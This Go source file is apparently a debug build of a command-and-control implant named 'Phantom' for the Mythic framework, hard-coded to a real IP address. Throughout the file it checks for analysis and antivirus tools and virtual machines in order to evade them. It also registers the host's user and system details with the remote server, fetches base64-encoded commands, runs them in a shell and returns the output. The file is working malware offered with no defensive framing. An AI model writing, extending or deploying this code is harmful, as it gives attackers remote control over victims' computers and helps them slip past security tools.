package main

import (
        "bytes"
        "crypto/tls"
        "encoding/base64"
        "encoding/json"
        "fmt"
        "io"
        "math/rand"
        "net/http"
        "os"
        "os/exec"
        "runtime"
        "strings"
        "time"
)

const (
        mythicURL = "https://37.27.249.191:7443"
        userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
)

type CheckinPayload struct {
        Action       string                 `json:"action"`
        IP           string                 `json:"ip"`
        OS           string                 `json:"os"`
        User         string                 `json:"user"`
        Host         string                 `json:"host"`
        PID          int                    `json:"pid"`
        UUID         string                 `json:"uuid"`
        Architecture string                 `json:"architecture"`
        Domain       string                 `json:"domain"`
        Extra        map[string]interface{} `json:"extra"`
}

type TaskResponse struct {
        UUID     string `json:"uuid"`
        TaskID   string `json:"task_id"`
        Response string `json:"response"`
        Status   string `json:"status"`
}

func writeLog(message string) {
        timestamp := time.Now().Format("2006-01-02 15:04:05")
        logFile, err := os.OpenFile("phantom_debug.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
        if err != nil {
                return
        }
        defer logFile.Close()
        
        logFile.WriteString(fmt.Sprintf("[%s] %s\n", timestamp, message))
        
        // Também mostrar no console se executado diretamente
        if len(os.Args) > 1 && os.Args[1] == "-debug" {
                fmt.Printf("[%s] %s\n", timestamp, message)
        }
}

func DetectHostileEnvironment() bool {
        writeLog("Starting environment detection...")
        
        hostileProcesses := []string{
                "ollydbg", "x64dbg", "windbg", "ida", "ida64", "wireshark", "tcpview",
                "regmon", "filemon", "procmon", "vmware", "virtualbox", "vbox", "qemu",
                "sandboxie", "cuckoo", "anubis", "threat", "joebox", "comodo", "sunbelt",
                "avp", "avast", "kaspersky", "norton", "mcafee", "malwarebytes", "defender",
        }
        
        for _, proc := range hostileProcesses {
                cmd := exec.Command("tasklist", "/FI", fmt.Sprintf("IMAGENAME eq %s.exe", proc))
                if output, err := cmd.Output(); err == nil {
                        if strings.Contains(strings.ToLower(string(output)), proc) {
                                writeLog(fmt.Sprintf("Hostile process detected: %s", proc))
                                return true
                        }
                }
        }
        
        cmd := exec.Command("wmic", "computersystem", "get", "manufacturer")
        if output, err := cmd.Output(); err == nil {
                manufacturer := strings.ToLower(string(output))
                writeLog(fmt.Sprintf("System manufacturer: %s", manufacturer))
                vmStrings := []string{"vmware", "virtualbox", "vbox", "qemu", "xen", "parallels", "microsoft corporation", "innotek"}
                for _, vm := range vmStrings {
                        if strings.Contains(manufacturer, vm) {
                                writeLog(fmt.Sprintf("VM detected: %s", vm))
                                return true
                        }
                }
        }
        
        writeLog(fmt.Sprintf("CPU count: %d", runtime.NumCPU()))
        if runtime.NumCPU() < 2 {
                writeLog("Insufficient CPU cores detected")
                return true
        }
        
        writeLog("Environment check passed")
        return false
}

func createHTTPClient() *http.Client {
        return &http.Client{
                Transport: &http.Transport{
                        TLSClientConfig: &tls.Config{
                                InsecureSkipVerify: true,
                                ServerName:         "",
                        },
                },
                Timeout: 30 * time.Second,
        }
}

func RegisterWithMythic() error {
        writeLog("Starting Mythic registration...")
        
        hostname, _ := os.Hostname()
        uuid := fmt.Sprintf("phantom-%d-%s", time.Now().Unix(), hostname)
        
        writeLog(fmt.Sprintf("Generated UUID: %s", uuid))
        writeLog(fmt.Sprintf("Hostname: %s", hostname))
        writeLog(fmt.Sprintf("Username: %s", os.Getenv("USERNAME")))
        writeLog(fmt.Sprintf("OS: %s", runtime.GOOS))
        writeLog(fmt.Sprintf("Architecture: %s", runtime.GOARCH))
        
        endpoints := []string{
                "/api/v1.4/agent_message",
                "/agent_message", 
                "/api/v1.3/agent_message",
                "/new/callback",
                "/callback",
                "/",
        }
        
        payload := CheckinPayload{
                Action:       "checkin",
                IP:           "127.0.0.1",
                OS:           runtime.GOOS,
                User:         os.Getenv("USERNAME"),
                Host:         hostname,
                PID:          os.Getpid(),
                UUID:         uuid,
                Architecture: runtime.GOARCH,
                Domain:       "",
                Extra: map[string]interface{}{
                        "process_name": "explorer.exe",
                        "integrity":    "medium",
                },
        }
        
        jsonData, err := json.Marshal(payload)
        if err != nil {
                writeLog(fmt.Sprintf("JSON marshal error: %s", err.Error()))
                return err
        }
        
        writeLog(fmt.Sprintf("Payload JSON: %s", string(jsonData)))
        
        client := createHTTPClient()
        
        for i, endpoint := range endpoints {
                fullURL := mythicURL + endpoint
                writeLog(fmt.Sprintf("Trying endpoint %d/%d: %s", i+1, len(endpoints), fullURL))
                
                req, err := http.NewRequest("POST", fullURL, bytes.NewBuffer(jsonData))
                if err != nil {
                        writeLog(fmt.Sprintf("Request creation error for %s: %s", endpoint, err.Error()))
                        continue
                }
                
                req.Header.Set("Content-Type", "application/json")
                req.Header.Set("User-Agent", userAgent)
                req.Header.Set("Accept", "*/*")
                req.Header.Set("Connection", "keep-alive")
                
                writeLog(fmt.Sprintf("Sending POST request to %s", fullURL))
                
                resp, err := client.Do(req)
                if err != nil {
                        writeLog(fmt.Sprintf("HTTP error for %s: %s", endpoint, err.Error()))
                        continue
                }
                
                body, _ := io.ReadAll(resp.Body)
                writeLog(fmt.Sprintf("Response from %s - Status: %d, Body: %s", endpoint, resp.StatusCode, string(body)))
                resp.Body.Close()
                
                if resp.StatusCode < 500 {
                        writeLog(fmt.Sprintf("Registration successful with endpoint: %s", endpoint))
                        return nil
                }
        }
        
        writeLog("All registration endpoints failed")
        return fmt.Errorf("all endpoints failed")
}

func GetMythicTasks() (string, error) {
        hostname, _ := os.Hostname()
        uuid := fmt.Sprintf("phantom-%d-%s", time.Now().Unix(), hostname)
        
        endpoints := []string{
                "/api/v1.4/agent_message",
                "/agent_message",
                "/api/v1.3/agent_message", 
                "/new/callback",
                "/callback",
                "/",
        }
        
        client := createHTTPClient()
        
        for _, endpoint := range endpoints {
                fullURL := mythicURL + endpoint + "?uuid=" + uuid
                writeLog(fmt.Sprintf("Checking for tasks at: %s", fullURL))
                
                req, err := http.NewRequest("GET", fullURL, nil)
                if err != nil {
                        writeLog(fmt.Sprintf("Task request creation error: %s", err.Error()))
                        continue
                }
                
                req.Header.Set("User-Agent", userAgent)
                req.Header.Set("Accept", "*/*")
                
                resp, err := client.Do(req)
                if err != nil {
                        writeLog(fmt.Sprintf("Task request error: %s", err.Error()))
                        continue
                }
                
                if resp.StatusCode == 200 {
                        body, err := io.ReadAll(resp.Body)
                        resp.Body.Close()
                        if err == nil && len(body) > 0 {
                                bodyStr := string(body)
                                writeLog(fmt.Sprintf("Task response: %s", bodyStr))
                                if !strings.Contains(bodyStr, "<html>") && 
                                   !strings.Contains(bodyStr, "<!doctype") &&
                                   len(bodyStr) > 5 {
                                        if decoded, err := base64.StdEncoding.DecodeString(bodyStr); err == nil {
                                                writeLog(fmt.Sprintf("Decoded task: %s", string(decoded)))
                                                return string(decoded), nil
                                        }
                                        return bodyStr, nil
                                }
                        }
                } else {
                        writeLog(fmt.Sprintf("Task check failed - Status: %d", resp.StatusCode))
                        resp.Body.Close()
                }
        }
        
        return "", nil
}

func ExecuteCommand(command string) string {
        writeLog(fmt.Sprintf("Executing command: %s", command))
        
        var cmd *exec.Cmd
        
        if runtime.GOOS == "windows" {
                cmd = exec.Command("cmd", "/c", command)
        } else {
                cmd = exec.Command("sh", "-c", command)
        }
        
        output, err := cmd.Output()
        if err != nil {
                writeLog(fmt.Sprintf("Command execution error: %s", err.Error()))
                return fmt.Sprintf("Error: %s", err.Error())
        }
        
        writeLog(fmt.Sprintf("Command output: %s", string(output)))
        return string(output)
}

func SendMythicResponse(taskID, output string) error {
        writeLog(fmt.Sprintf("Sending response for task: %s", taskID))
        
        hostname, _ := os.Hostname()
        uuid := fmt.Sprintf("phantom-%d-%s", time.Now().Unix(), hostname)
        
        response := TaskResponse{
                UUID:     uuid,
                TaskID:   taskID,
                Response: base64.StdEncoding.EncodeToString([]byte(output)),
                Status:   "completed",
        }
        
        jsonData, err := json.Marshal(response)
        if err != nil {
                writeLog(fmt.Sprintf("Response JSON error: %s", err.Error()))
                return err
        }
        
        writeLog(fmt.Sprintf("Response JSON: %s", string(jsonData)))
        
        endpoints := []string{
                "/api/v1.4/agent_message",
                "/agent_message",
                "/api/v1.3/agent_message",
                "/new/callback", 
                "/callback",
                "/",
        }
        
        client := createHTTPClient()
        
        for _, endpoint := range endpoints {
                fullURL := mythicURL + endpoint
                writeLog(fmt.Sprintf("Sending response to: %s", fullURL))
                
                req, err := http.NewRequest("POST", fullURL, bytes.NewBuffer(jsonData))
                if err != nil {
                        writeLog(fmt.Sprintf("Response request error: %s", err.Error()))
                        continue
                }
                
                req.Header.Set("Content-Type", "application/json")
                req.Header.Set("User-Agent", userAgent)
                req.Header.Set("Accept", "*/*")
                
                resp, err := client.Do(req)
                if err != nil {
                        writeLog(fmt.Sprintf("Response send error: %s", err.Error()))
                        continue
                }
                
                writeLog(fmt.Sprintf("Response status: %d", resp.StatusCode))
                
                if resp.StatusCode < 500 {
                        resp.Body.Close()
                        writeLog("Response sent successfully")
                        return nil
                }
                resp.Body.Close()
        }
        
        writeLog("Failed to send response to all endpoints")
        return fmt.Errorf("failed to send response")
}

func main() {
        writeLog("=== PHANTOM DEBUG AGENT STARTING ===")
        writeLog(fmt.Sprintf("Running on: %s %s", runtime.GOOS, runtime.GOARCH))
        writeLog(fmt.Sprintf("Process ID: %d", os.Getpid()))
        
        if DetectHostileEnvironment() {
                writeLog("Hostile environment detected - exiting")
                os.Exit(0)
        }
        
        writeLog("Environment check passed - proceeding")
        
        // Delay inicial menor para debug
        delay := time.Duration(5+rand.Intn(10)) * time.Second
        writeLog(fmt.Sprintf("Initial delay: %v", delay))
        time.Sleep(delay)
        
        writeLog("Attempting Mythic registration...")
        err := RegisterWithMythic()
        if err != nil {
                writeLog(fmt.Sprintf("Registration failed: %s", err.Error()))
                time.Sleep(time.Duration(30+rand.Intn(60)) * time.Second)
        } else {
                writeLog("Registration completed successfully")
        }
        
        rand.Seed(time.Now().UnixNano())
        writeLog("Starting main loop...")
        
        for i := 0; i < 10; i++ { // Limitar a 10 iterações para debug
                writeLog(fmt.Sprintf("Loop iteration %d", i+1))
                
                command, err := GetMythicTasks()
                if err == nil && command != "" {
                        writeLog(fmt.Sprintf("Received command: %s", command))
                        output := ExecuteCommand(command)
                        SendMythicResponse("task-"+fmt.Sprintf("%d", time.Now().Unix()), output)
                } else {
                        writeLog("No commands received")
                }
                
                jitter := time.Duration(5+rand.Intn(10)) * time.Second
                writeLog(fmt.Sprintf("Sleeping for: %v", jitter))
                time.Sleep(jitter)
        }
        
        writeLog("Debug session completed")
}